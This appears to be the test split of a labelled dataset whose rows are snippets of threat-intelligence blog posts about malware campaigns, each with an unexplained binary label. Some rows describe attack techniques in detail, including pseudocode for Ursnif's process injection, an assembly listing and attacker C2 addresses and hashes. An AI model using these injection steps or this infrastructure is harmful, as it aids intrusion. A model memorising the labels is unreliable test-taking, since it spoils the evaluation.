ID,SPLIT,description,long_golden_tar
83,TEST_long,"Secret Chats and has weak default settings. https://core.telegram.org/tsi/e2ee-simple#2-why-are-there-no-secret-chats-on-desktop-apps The snippet was taken from the telegram.org website and clearly states that Secret Chats are NOT supported on desktop and web versions of Telegram. These versions are cloud-based, so there are no assumptions over the local storage contents. The malware abuses the lack of Secret Chats which is a feature, not a bug. Telegram desktop by default doesn't have the auto-logout feature active. These two elements together are what allows the malware to hijack the session and consequently the conversations. This does not mean that Telegram is broken or that this technique is applicable to the Secret Chats done using mobile platforms. Telegram desktop data value The malware is gathering all Telegram cache data, and zipping it before it exfiltrates the files. Code used to prepare data for exfiltration Through our investigation, we were able to find a tutorial video on how to access and use this information to hijack Telegram sessions. In summary, by restoring cache and map files into an existing Telegram desktop installation, if the session was open. It will be possible to access the victims session, contacts and previous chats. Talos believes with high confidence the author of the video and the author of the malware are the same. This is rather unusual, however. To the best of Talos' knowledge, there is no tool to decrypt the cache information. In the GitHub TelegramDesktop",1
84,TEST_long,"from the ESET security community First Twitter‑controlled Android botnet discovered Detected by ESET as Android/Twitoor, this malware is unique because of its resilience mechanism. Instead of being controlled by a traditional command-and-control server, it receives instructions via tweets. Editor 24 Aug 2016 - 02:05PM Share Detected by ESET",0
85,TEST_long,"the attackers left this piece of code in a production compilation, it might show how careless they are. Basically, if anyone else would like to test Ursnif on a virtual machine, they can just create a file with that name at that location and the malware will work properly with no need to change the virtual machine's configurations. Next, the malware will make sure that all of the users on the machine are infected, by enumerating the registry root key HKU and for each user key, it will put an appropriate startup value, as well as the payload on each AppData folder of each user. Registry Keys used: • HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Run\ • HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\ AppData ○ (Value equals the folder to be used for the malware, for example: C:\Users\Administrator\Appdata\Roaming\"") After this procedure, we move on to the injection method. And It Continues With Another Executable To Be Injected In the second part, the malware will look for a legitimate process to run in its context. Running in a different process context allows the malware to bypass firewall rules which let some processes through without alerting or blocking them. Internally, the malware calculates a unique checksum for each process name it finds, in order to obfuscate the processes into which it will try to inject itself. Instead of injecting to `explorer.exe` for example, a checksum will be calculated, resulting in something like 0x17F9B5AA. Then, it will check if that value matches a value from an internal list of checksums, and only if it exists in that list, it will begin the injection method on that process. Let's examine a pseudo code (as simple as possible) of how the first part of the injection looks: /* Obtain the process pid to inject to */ dwPID = GetInjectProcess () hProcess = OpenProcess (dwPID, ...) pAddress = GetProcAddress ( ""ntdll.dll"" , ""RtlExitUserThread"" ) /* Create remote thread in suspended mode */ hThread = CreateRemoteThread (hProcess, /* Remote process handle */ CREATE_SUSPENDED , /* creation flags */ pAddress, /* thread function address */ ...) /* Read remote procedure first four bytes */ dwBackupData = ZwReadVirtualMemory (hProcess, /* Remote process handle */ pAddress, /* Address to read */ 4, /* number of bytes to read */ ...) /* Change address protection to `writable` */ VirtualProtectEx ( hProcess, /* Remote process handle */ READ_WRITE_EXECUTE , /* New protection flags */ pAddress, /* Address to change protection on */ 4, /* Size of address */ ...) ZwWriteVirtualMemory (hProcess, /* Remote process handle */ pAddress, /* Address to overwrite */ 0xCCCCFEEB, /* Data to write */ 4, /*",0
86,TEST_long,"of these documents relied upon socially engineering their victims into enabling macros in order to infect the targeted workstation. Once macros were enabled, the threat actor-written code would attempt to obtain a trojan hosted on an adversarial payload command and control node. This was a fully functional remote access trojan, that would allow the threat actors to interact with the compromised workstation via the adversarial interactive command and control node. This activity shows an increased level of sophistication from related samples observed months prior. The threat actor added a persistence feature at the document level, in order to try and establish persistence on the workstation. One notable feature was that the macro was named “H-3 Airstrike,” which was likely a reference to a surprise air attack by the Iranian Air Force during the Iran–Iraq War, in which they destroyed Iraqi aircraft to include a new shipment of Mirage F1",1
87,TEST_long,"cyberthreats with top cybersecurity experts and machine learning assisted detection Customer Success Every day, 300+ full-time personnel are dedicated to delivering on our core company value Endpoint Next-gen endpoint defense with continuous adaptation and hardening against the threat landscape Network eSentire network services hunts and contains elusive cyberattacks no matter where your environment lives Log Cloud-native SIEM alternative aggregates actionable intel from network, endpoints, apps and cloud services Cloud Critical visibility and always-on monitoring across your cloud attack surface Managed Risk Programs Cybersecurity advisory and",1
88,TEST_long,"malware. After further research, we found the malware has been repackaged into several pirated iOS apps that are available for download via multiple channels. In this blog, we will discuss how the TinyV Trojan spreads and how it works. Repackaging and Spreading TinyV was repackaged into some pirated iOS apps for jailbroken devices. Infected iOS apps include “Watermelon Player (西瓜播放器)”, “Youku (优酷)”, “iQiYi (爱奇艺)” and others. After repackaging, these apps were uploaded to websites for downloading. The infected Watermelon Player was available from its official website xigua[.]com. It is advertised as an app for watching pirated videos",0
89,TEST_long,? Reply Leave a Reply Cancel Reply Your email address will not be published. Required,1
90,TEST_long,"malicious activity all the way down to the attacker responsible for it and find out how they have been taking advantage of the social networking platform for years, compromising legitimate websites to host malware and, in the end, successfully made their way to tens of thousands of victims mainly from Libya, but also in Europe, the United States and Canada. Based on information we shared, Facebook took down the pages and accounts that distributed the malicious artifacts belonging to this operation. In the Name of Haftar The Facebook page impersonating Khalifa Haftar was created at the beginning of April 2019, and has since managed to recruit more than 11,000 followers. The page shares posts which have political themes, and include URLs to download files marketed as leaks from Libya’s intelligence units. The description in the posts claims that those leaks contain documents exposing countries such as Qatar or Turkey conspiring against Libya, or photos of a captured pilot that tried to bomb the capital city of Tripoli. Some of the URLs were even supposed",1
91,TEST_long,"the globe: ZDNet China ZDNet France ZDNet Germany ZDNet Korea ZDNet Japan Iranian hackers deploy new ZeroCleare data-wiping malware IBM identifies new ZeroCleare destructive malware targeting energy companies active in the Middle East region. By Catalin Cimpanu for Zero Day | December 4, 2019 -- 14:47 GMT (14:47 GMT) | Topic: Security Microsoft identifies super data-wiping malware: Who's behind it? Watch Now Special feature Special report: A winning strategy for cybersecurity (free PDF) This ebook, based on the latest ZDNet/TechRepublic special feature, offers a detailed look at how to build risk management policies to protect your critical digital assets. Read More Security researchers from IBM said today they identified a new strain of destructive data-wiping malware that was developed by Iranian state-sponsored hackers and",1
92,TEST_long,"Careers Partners Resources Moving Target Defense Blog Cybersecurity trends, exploring moving target defense and putting endpoint threat prevention first Flash Exploit, CVE-2018-4878, Spotted in The Wild as Part of Massive Malspam Campaign Posted by Michael Gorelik on February 25, 2018 Find me on: LinkedIn Twitter Tweet On February 22, 2018, Morphisec Labs spotted several malicious word documents exploiting the latest Flash vulnerability CVE-2018-4878 in the wild in a massive malspam campaign . Adobe released a patch early February, but it will take some companies",0
93,TEST_long,"FortiGuard Labs has seen a number of variations and adaptations written by multiple authors entering the IoT threat landscape. These modified Mirai-based bots differ by adding new techniques, in addition to the original telnet brute force login, including the use of exploits and the targeting of more architectures . We have also observed that the motivation for many of the modifications to Mirai is to earn more money. Mirai was originally designed for DDoS attack, but later modifications were used to target vulnerable ETH mining rigs",0
94,TEST_long,"can turn affected targets into botnet zombies used in distributed-denial-of-service (DDoS) attacks. The attack chain involves searching for exposed or publicly accessible Elasticsearch databases/servers. The malware would invoke a shell with an attacker-crafted search query with encoded Java commands. Once this is successfully carried out, the first malicious script is downloaded from a domain, which, in our analysis, appear to be expendable or easy-to-replace. The first-stage script will attempt to shut down the firewall as well as competing and already-running cryptocurrency mining activities and other processes. The second-stage script is then retrieved, likely from a compromised website. The ways that",0
95,TEST_long,"the C2 address, which is not something we see often. At the same time, it uses HTTPS to download Lua byte-code files, and uses DNS over HTTPS to get the C2 name to ensure secure communication between the bots, the Web Server and the C2. We noticed that there are already 2 versions of Godlua Backdoor and there are ongoing updates. We also observed that attackers has been using Lua command to run Lua code dynamically and initiate HTTP Flood attacks targeting some websites. Overview At present, we see that there are two versions of Godlua. Version 201811051556 is obtained by traversing Godlua download servers and there has been no update on it. Version 20190415103713 ~ 2019062117473 is active and is",0
96,TEST_long,"at a top foreign university, requesting for feedback on his supposed thesis which includes recommendations on how to end the Hong Kong unrest. The email contained a link to a Google drive ZIP file. The contents of FYI.zip downloaded from the Google Drive link The ZIP archive contained three files – an August 2019 policy brief downloaded from Freedom House regarding the Democratic Crisis in Hong Kong, a September 2019 Hong Kong report downloaded from Human Rights First, and a supposed",1
97,TEST_long,"initiatives across Operational Strategy, Incident Response, Threat Management, and Security Operations to ensure cyber risk postures align with business goals. Most recently as a Senior Vice President of Information Security at Bank of America, Mr. Camacho was responsible for overseeing the Threat Management Program. An entrepreneur, Mr. Camacho also serves as CEO for NinjaJobs: a career-matching community for elite cybersecurity talent. He has a BS in Decision Sciences & Management of Information Systems from George Mason University. Lisa Iadanza Chief People Officer Lisa M. Iadanza leads all functional areas of People Operations at Flashpoint, including human resources, talent acquisition & management, employee engagement, and developing high performance teams. In addition to collaborating with the executive team to drive strategic growth, she plays an integral role in fostering Flashpoint’s culture and mission. Driven by her passions for mentorship, employee advocacy, and talent development, Ms. Iadanza has more than twenty years of experience in building, scaling, and leading human resources functions. Prior to Flashpoint, she held leadership roles at Conde Nast, Terra Technology, and FreeWheel. She is a member of the Society for Human Resources Management (SHRM) and holds a bachelor’s degree in management with concentrations in human resources and marketing from State University of New York at Binghamton. Rob Reznick VP of Finance and Corporate Development Rob Reznick leads the finance, accounting, and corporate development teams at Flashpoint. Rob previously served as Director of Finance & Accounting for 1010data (acquired by Advance/Newhouse), and Director of Finance for Financial Guard (acquired by Legg Mason) after prior work in forensic accounting and dispute consulting. Mr. Reznick is a Certified Public Accountant and holds an MBA and MAcc from the Fisher College of Business at the Ohio State University, and a BBA from the Ross School of Business at the University of Michigan. Tom Hofmann VP Intelligence Tom Hofmann leads the intelligence directorate that is",0
98,TEST_long,"All campaigns used as the initial stage an office document (PowerPoint or Excel) armed with macro and some of them used injection methods. All attack operations used a “Signed Binary Proxy Execution” technique abusing Mshta, a legit Microsoft tool, and used at least an executable file for the infection. In addition, the use of PowerShell stage or the abuse of legit web service has been reported in some campaigns. Furthermore the CMSTP bypass exploit is a new feature present only in the 2020, because the first malwares identified to exploit this vulnerability all date back to mid/end 2019, making think the fact that the Threat Actor likes to test the latest disclosed exploits in order to make its campaigns always at the forefront. Regarding persistence mechanisms, we note that initially scheduled tasks were used, but in the latest infections the registry run keys were used. All threats use at least one obfuscation method to make the analysis harder. Looking at the evolution of the final payloads, we can say that this evolution is certainly due to a chronological factor, since Revenge rat had become obsolete, but the evolution is also due to the technological factor and its means: revenge rat has the classic functionality of spyware, while AZORult is considered an info stealer. As a last payload, Agent Tesla was used which collects all the functionality of the previous payloads as it is considered an info stealer and spyware. Technical Analysis The infection chain starts with a malicious Microsoft Powerpoint weaponized",1
99,TEST_long,"same actor behind these two attacks is the same due to an overlap in the two attacks' infrastructure. If that is the case, the actor could switch between Pony and FormBook to be able to continue their malicious activities for more than a year. Infection Vector Phishing Campaign This campaign starts with a malicious email containing two attachments. Here is a snippet of the email: The email pretends to be an order sent from the sales department of a company located in Spain. The website's details and phone number appear to have been copied from that of a genuine company. The email contains two attachments: A blank malicious Microsoft Office document template file. (.dotm) A malicious PDF document that is also blank. (.pdf) First Office MalDoc (Attached) The email contains two attachments as mentioned. One of these is a Microsoft Office document template file. This file type is normally used to share templates. The 'normal.dotm' file is the default Microsoft Word template that opens when Word is launched. The attacker, however, does not use the .dotm file format to share templates, but rather to download an additional Office document. If an example document from the campaign, named ""STMORDER-442799.dotm,"" is opened, it appears blank. However, like most Office documents, if the file is unzipped and opened, you can access the attributes and XML information. This is where the",0
100,TEST_long,"intelligence agency. Since then, several examples of malware created by Animal Farm have been found and publicly documented, in particular: Casper, a stealthy first-stage implant, documented by ESET in last March Bunny, a Lua-based backdoor, documented by Marion Marschalek (Cyphort) Babar, an espionage platform, also analyzed by Marion Marschalek The connection between those pieces of malware and the group described in CSE slides has been convincingly established, for example by Paul Rascagnères (G Data) . In this blog post we add a new piece to the puzzle with Dino, another malicious program belonging to Animal Farm’s arsenal. Introduction The sample of Dino documented in this blog post was used in 2013 against targets in Iran. The original means of infection is unknown, though we believe Dino was installed by another program, as it contains an uninstallation command without the corresponding installation procedure. Given the set of commands it can receive, Dino’s main goal seems to be the exfiltration of files from its targets. The binary’s original name, “Dino.exe”, has been left visible by its authors, as was the case with Casper. Dino – which could be referring to the pet character from The Flintstones cartoon show – was already mentioned in a recent Kaspersky blog as a “full-featured espionage platform,” but no technical analysis has been published yet. Roughly, Dino can be described as an elaborate backdoor built in a modular fashion. Among its technical innovations, there is a custom file system to execute commands in a stealthy fashion, and a complex task-scheduling module working",0
101,TEST_long,"with a large amount of malicious traffic: several million requests per day from more than 100,000 unique IP addresses are sent to the Phorpiex C&C servers. By our assessment, the monthly volume of the botnet’s C&C traffic may exceed 70 TB. Therefore, Phorpiex doesn’t use public VPS hosting services. Instead, it uses dedicated IP subnets registered to figureheads. Botnet Architecture Initially, the Phorpiex has been known as a botnet operated using IRC protocol (also known as Trik). However, recent Phorpiex campaigns have switched to modular architecture and got rid of IRC communication. We barely saw any of its IRC C&C servers online in 2019. However, our sinkholes still indicate many thousands of hosts infected with Trik. When we did spot IRC C&C servers online, we managed to capture a command for loading another malware to the infected machines: Figure 1 – Trik C&C communication dump with the decrypted URL. We assume that this malware, self-named Tldr (probably stands for “TrikLoader”), has currently become the core part of the Phorpiex botnet. Tldr is a downloader that uses HTTP protocol for communication with C&C servers. Its main purpose is to load another malware on the infected machines. Some Tldr samples have the functionality of a computer worm and can spread through removable drives. We also observed variants of the malware that",0
102,TEST_long,"makes a POST request to dw.downloadtesting[.]com, resulting in the installation of the Quasar RAT on the victim machine. Additional Downeks downloaders connecting to the previously-observed server dw.downloadtesting[.]com were also found in this attack: SHA256: 15abd32342e87455b73f1e2ecf9ab10331600eb4eae54e1dfc25ba2f9d8c2e8a SHA256: 9a8d73cb7069832b9523c55224ae4153ea529ecc50392fef59da5b5d1db1c740 Further research identified dozens of Dowenks and Quasar samples related to these attackers. All included decoy documents written in Arabic (all related to Middle Eastern politics) or Hebrew. Most of them use the same mutex structure, share the same fake icon and unique metadata details, file writes, registry operations, and fake common program metadata, as seen in DustySky samples. The Downeks downloader and Quasar C2 infrastructures are each self-contained and independent of each other. However, we did find a single shared IP address demonstrably connecting the Downeks downloader and Quasar C2 infrastructure s. The below chart (Figure 1) shows Quasar infrastructure (top), Downeks (bottom), and the shared IP link. Figure 1- Quasar and Downeks Charting the samples and infrastructure clearly shows the separate Downeks campaigns, and infrastructure links (Figure 2): Figure 2- Infrastructure Patterns and Connections In Figure 2, top-right (green) has the Quasar infrastructure (Figure 3), with a link to the Downeks infrastructure. Left (yellow) is DustySky infrastructure (Figure 4) and the links to this Downeks campaign. As well as similarities in the code, decoys and targets, we also identified C2 infrastructure links between DustySky and this campaign. The remainder is sub-campaigns of Downeks samples, their infrastructure, their links – and a favored ISP (center) (Figure 5). The timing of the attacks is commensurate with the Middle-Eastern working week (Figure 6): Figure 6- Attacks by day-of-the-week The sample build days-of-the-week follow an almost identical pattern (Figure 7): Figure 7- Builds by day-of-the-week We saw five samples built on the same date in December 2015, and six on the same date in January, further solidifying the link between each sample. Quasar We analyzed a Quasar sample we found that was communicating with an active C2 server at the time of analysis: SHA256: 4393ff391396cdfd229517dd98aa7faecad04da479fe8ca322f035ceee363273 Quasar is a publicly-available commodity RAT, an evolution of his earlier xRAT, by German developer “MaxXor”. This sample is a modified version of Quasar, most likely forked from open source version 1.2.0.0 on GitHub . The client was likely built using the Quasar server client builder. We observed the following customizations: C2 server: app.progsupdate[.]com, which resolved to 185.141.25[.]68), over port 4664. Quasar mutex name: VMFvdCsC7RFqerZinfV0sxJFo Keylogger log location: Users\hJTQwqwwSCkZU\AppData\Roaming\GoogleDesktop\<date> The malware uses fake version information to appear as a Microsoft update program, as well as Google Desktop once unpacked. Packer This sample is packed by “Netz”, a simple .NET Framework packer which stores the original executable compressed (zlib) as a resource. At runtime, the packer decompresses the resource and uses Reflection to load the assembly, find its Entry point, and Invoke it. Extracting the payload is straight forward – we simply",1
103,TEST_long,"of those binaries was initially thought to be a new variant of the Padpin ATM malware family. However, after reverse analysis, we found that it to be part of a brand new family, which we called Alice. ATM malware has been around since 2007, but over the past nine years we have only learned of eight unique ATM malware families, including Alice. This new discovery is remarkable because it shows a clear tendency for malware writers to attack an ever-increasing variety of platforms. This is especially acute against ATMs, due to the high monetary value they represent. This tendency has accelerated enormously over the last 2-3 years, which is when the bulk of those families have been discovered. Technical Details The family name “Alice” was derived from the version information embedded in the malicious binary:",0
104,TEST_long,"samples, it was clear that they were being generated programmatically and so I set out to try and identify the source. Within each of the executables was an embedded string for the file that gets created. 004015BC |. C74424 08 05F04>MOV DWORD PTR SS:[ESP+8],75809731.0040>; ASCII ""%s\\A62q1gMHhRWy"" 1 004015BC | . C74424 08 05F04 > MOV DWORD PTR SS : [ ESP + 8 ] , 75809731.0040 > ; ASCII ""%s\\A62q1gMHhRWy"" The file name is randomized between samples which was a major clue that there was a builder. This value is again referenced later on deep within multiple layers of PowerShell scripts and gave further credence to this theory, as typically these random file names are generated on the fly and not embedded within. The initial executable created by PowerStager is pretty straight forward. It gets the %TMP% environment path and creates the file with the embedded file name. Afterwards it performs two memcpy() calls for data found within the .data section of the executable and moves them into a new memory page. For the sample looked at in this analysis, the first memcpy() grabs data from offset 0x20 in the .data section, whereas the second memcpy() grabs the same size of data from offset 0x67E0. Finally, it runs a decoding function on it before finally saving it to the file. 0040164E |> /8D95 D8C6FFFF /LEA EDX,[LOCAL.3658]00401654 |. |8B45 F4 |MOV EAX,[LOCAL.3]00401657 |. |01D0 |ADD EAX,EDX ; 75809731.004067E000401659 |. |0FB618 |MOVZX EBX,BYTE PTR DS:[EAX]0040165C |. |8B4D F4 |MOV ECX,[LOCAL.3]0040165F |. |89C8 |MOV EAX,ECX00401661 |. |C1E8 06 |SHR EAX,600401664 |. |BA 9D889704 |MOV EDX,497889D00401669 |. |F7E2 |MUL EDX ; 75809731.004067E00040166B |. |89D0 |MOV EAX,EDX ; 75809731.004067E00040166D |. |C1E8 02 |SHR EAX,200401670 |. |69C0 C0370000 |IMUL EAX,EAX,37C000401676 |. |29C1 |SUB ECX,EAX00401678 |. |89C8 |MOV EAX,ECX0040167A |. |0FB68405 188FFF>|MOVZX EAX,BYTE PTR SS:[EBP+EAX+FFFF8F18]00401682 |. |31C3 |XOR EBX,EAX00401684 |. |89D9 |MOV ECX,EBX00401686 |. |8D95 D8C6FFFF |LEA EDX,[LOCAL.3658]0040168C |. |8B45",0
105,TEST_long,"publicly reported that OceanLotus, a suspected Vietnam state-sponsored adversary, has conducted multiple targeted intrusions against auto manufacturers. This post examines a second-stage tool, JEShell, used during one such intrusion. JEShell contains code-level overlaps with the OceanLotus KerrDown malware first publicly described in a Medium post and",0
106,TEST_long,"Australia Europe India United Kingdom United States ZDNet around the globe: ZDNet China ZDNet France ZDNet Germany ZDNet Korea ZDNet Japan Broadcaster ABS-CBN customer data stolen, sent to Russian servers Updated: The data theft is the work of Magecart, a group connected to attacks against British Airways and Ticketmaster. By Charlie Osborne for Zero Day | September 18, 2018 -- 15:17 GMT (16:17 BST) | Topic: Security Major vendors like PayPal affected by mobile point-of-sale vulnerabilities Watch Now Customers of ABS-CBN may be facing the possibility of the theft of their financial data due to a payment skimmer which has been discovered in the major Filipino broadcaster's online store. Security Theoretical technique to abuse EMV cards detected used in",1
107,TEST_long,"using the Windows Installer service, a Lokibot variant that uses ISO images , and a variant with an improved persistence mechanism using steganography . Recently, we discovered LokiBot (detected by Trend Micro as Trojan.Win32.LOKI) impersonating a popular game launcher to trick users into executing it on their machines. Further analysis revealed that a sample of this variant employs a quirky, installation routine that involves dropping a compiled C# code file. This unusual LokiBot",0
108,TEST_long,"User Account Control (UAC) bypass techniques have also been added. Document Details The following two documents, detailed below, have been observed in the latest round of attacks: MD5 hash: c538b2b2628bba25d68ad601e00ad150 SHA256 hash: b0f30741a2449f4d8d5ffe4b029a6d3959775818bf2e85bab7fea29bd5acafa4 Original Filename: РГНФ 2018-2019.doc The document shown in Figure 1 discusses Eurasian geopolitics as they relate to China, as well as Russia’s security. Figure 1: Sample document written in Russian MD5 hash: 7b0f14d8cd370625aeb8a6af66af28ac SHA256 hash: e29fad201feba8bd9385893d3c3db42bba094483a51d17e0217ceb7d3a7c08f1 Original Filename: Copy of communication from Security Council Committee (1718).doc The document shown in Figure 2 discusses sanctions on humanitarian operations in the Democratic People’s Republic of Korea (DPRK). Figure 2: Sample document written in English Macro Analysis In both documents, an embedded macro stores the malicious command line to be executed in the TextBox property (TextBox1.Text) of the document. This TextBox property is first accessed by the macro to execute the command on the system and is then overwritten to delete evidence of the command line. Stage 1: BAT File Download In Stage 1, the macro leverages the legitimate Microsoft Windows certutil.exe utility",1
109,TEST_long,"of incoming emails directed to many companies under our protective umbrella. These messages were leveraging FMLA (Family and Medical Leave Act) requests related to the ongoing CoronaVirus pandemics. These emails were weaponized with two versatile cyber-criminal tools: Himera and Absent-Loader. Figure1: Email vector example Loaders are a type of malicious code specialized in loading additional malware code into the victim's machine. Sometimes, a loader can assume "" stealer "" behavior, to opportunistically gatherer sensitive information even if they are not supposed to do that. Absent-Loader does that and despite its name behaves this way. In fact, stolen information market is definitely remunerative for cyber criminals:",1
110,TEST_long,"BlackEnergy/GreyEnergy. Oddly, Turla deployed spearphish macros almost identical to previous, non-public Zebrocy code in 2018. It’s fantastic to see some of these same points being repeated publicly by other research teams. A previous claim that Zebrocy distributed Sofacy’s XAgent as a second stage implant remains unsubstantiated but now is replaced with findings identical to these following the SAS2019 presentation, so it seems we are all slowly getting on the same page. A first course with new additions When we originally documented a Zebrocy malware incident in late 2015, we noted an Oct 2015 AutoIT downloader and a Delphi backdoor payload. Since then, we have noted a virtual salad of Zebrocy code tossed together, built with a handful of languages, often ripped from various code sharing sites. Zebrocy activity",0
111,TEST_long,"reported on a wave of OilRig attacks delivering a tool called QUADAGENT involving a Middle Eastern government agency. During that wave, we also observed OilRig leveraging additional compromised email accounts at the same government organization to send spear phishing emails delivering the OopsIE trojan as the payload instead of QUADAGENT. The OopsIE attack also targeted a government agency within the same nation state, though a different organization than the one targeted delivering QUADAGENT. The email subject was in Arabic, which translated to “Business continuity management training”. The email was sent to an address belonging to a user group, rather than a specific individual’s email address. Based on open source data collection, it appears the targeted group had publicly published several documents regarding business continuity management on the Internet, indicating the lures were purposefully crafted for this specific attack. Evasion Techniques The OopsIE variant delivered in this attack begins its execution by performing a series of anti-VM and sandbox checks. If any of the checks described in Table 1 are successful, the Trojan will exit without running any of its functional code. These evasion techniques are meant to thwart automated analysis in",1
112,TEST_long,"as DDos, Cryptojacking, Spaming, information stealing. Its’ only purpose is to setup the routers to be SSH tunneling proxy nodes. Also, unlike the typical botnets which try their best to infect as many victims as they can, this one has pretty much stopped looking for new bots after its’ active daily bot number reached low 200. It seems that the author is satisfied with the number which probably provides enough proxy service for whatever purpose he needs. The ELF file itself is",0
113,TEST_long,"these IOT botnets are increasingly targeting enterprise devices with outdated versions. All organizations should ensure they keep not only their systems up-to-date and patched, but also their IoT devices. For Palo Alto Networks customers, WidlFire detects all related samples with malicious verdicts. Additional protections are noted in the conclusion below. Research: On September 7, 2018, Unit 42 found samples of a Mirai variant that incorporates exploits targeting 16 separate vulnerabilities. While the use of multiple exploits within a single sample of Mirai has been observed in the past , this is the first known instance of Mirai targeting a vulnerability in Apache Struts. In addition, Unit 42 found the domain that is currently hosting these Mirai samples previously resolved to a different IP address during the month of August. During that time this IP was intermittently hosting samples of Gafgyt that incorporated an exploit against CVE-2018-9866 a SonicWall vulnerability affecting older versions of SonicWall Global Management System (GMS). SonciWall has been notified",0
114,TEST_long,"full network security Managed Web Application Firewall Keep your mission critical web applications secure with a Managed WAF Managed Application Control Endpoint allowlisting with real-time threat intelligence and monitoring Telco Security DDOS & broadband protection for APAC businesses and delivered by Singtel Jul 28, 2020 The Forrester Wave™: Global Managed Security Services Providers, Q3 2020 Analyst Report chevron_left Back Security Testing Security Testing Services Comprehensive suite of security testing capabilities managed within a unified portal Trustwave SpiderLabs An elite group of researchers, penetration testers and incident responders May 20, 2020 Once and Future Threats: What Security Testing Is and Will Be Ebook chevron_left Back Technology DbProtect Scalable enterprise platform to monitor & protect databases and big data stores AppDetectivePRO Database and big data scanner to find weaknesses that could lead to compromise Secure Email Gateway Full protection against email threats and sensitive data from exiting Secure Web Gateway Flexible solution to guard in real time against internet-borne threats Intrusion Detection & Prevention A high-speed solution that monitors your network & helps fortify the perimeter Next Generation Firewall Comprehensive network security with a low total cost of ownership Technology Partners Key Partners who augment the broad portfolio of security services Technology & Implementation Experts help determine the right assortment of technologies for your business Aug 05, 2019 The Underground Economy Ebook chevron_left Back Consulting Digital Forensics & IR Service that provides breach training and immediate response to incidents",0
115,TEST_long,inherently suspicious behavior. Unless they have a lot of customers writing compilers in Word macros.,1
116,TEST_long,"messages. Additionally, the actor(s) responsible are likely using a self-hosted email marketing solution called Acelle . Acelle adds extended email headers to messages sent via the platform in the format of X-Acelle-<variable>. The messages observed across campaigns using these TTPs have included a “Customer-Id” value matching “X-Acelle-Customer-Id: 5df38b8fd5b58”. While that field remained consistent across all observed campaigns, individual campaigns also shared overlapping “X-Acelle-Sending-Server_Id” and “X-Acelle-Campaign-Id” values. All of the messages also included a “List-Unsubscribe” header offering a link hosted at 45.153.184.84 suggesting that it is the server hosting the Acelle instance used across these campaigns. The sample table for one campaign below illustrates this data: Timestamp Sender Subject x-acelle-subscriber-id x-acelle-sending-server-id x-acelle-customer-id x-acelle-campaign-id 1/7/20 16:15 [email protected] tax return file 25474792e6f8c 5e14a2664ffb4 5df38b8fd5b58 5e14a2664ffb4 1/7/20 15:59 [email protected] tax return file 22e183805a051 5e14a2664ffb4 5df38b8fd5b58 5e14a2664ffb4 1/7/20 [email protected] tax return file 657e1a485ed77 5e14a2664ffb4 5df38b8fd5b58 5e14a2664ffb4 1/7/20 16:05 [email protected] tax return file ddbbffbcb5c6c 5e14a2664ffb4 5df38b8fd5b58 5e14a2664ffb4 The URLs requested by the malicious documents and serving the final MINEBRIDGE payloads delivered in each of these campaigns provide additional overlap across campaigns. In all observed cases, the domains used the same bullet-proof hosting service. The URI used to download the final payload was “/team/invest.php” or, in one case, “/team/rumba.php”. Perhaps the most fun overlap, however, was discovered when trying to identify additional artifacts of interest hosted at similar locations. In most cases a GET request to the parent directory of “/team/” on each of the identified domains served up the lyrics to rap group Onyx’s “Bang 2 Dis” masterpiece. We will refrain from sharing the specific verse hosted due to explicit content. One of the more notable characteristics of this activity",1
117,TEST_long,"Tags: AutoFocus , banking , Powershell , Retefe , Smoke Loader , Trojan , WildFire This post is also available in: 日本語 ( Japanese ) Retefe is one of the most targeted banking Trojans currently in the wild. While other families such as Zeus and Citadel are widely adopted by attackers targeting banking websites around the world, Retefe is consistently used to target",1
118,TEST_long,"Infection Vector The operator behind these campaigns uses compromised sites to spread fake updates masquerading as Adobe Flash, Chrome, and FireFox updates. When users navigate to the compromised website, the malicious JavaScript file is downloaded, mostly from a DropBox link. Before delivering the payload, the JavaScript sends basic system information to the server. After receiving further commands from the server, it then executes the final JavaScript to deliver the final payload. In our case, the JavaScript that delivers the payload is named Update.js, and it is executed from %AppData% with the help of wscript.exe. Figure 1 shows the infection flow. Figure 1: Infection Flow In-Depth Analysis of JavaScript The initial JavaScript file contains multiple layers of obfuscation. Like other malicious scripts, the first layer has obfuscation that builds",0
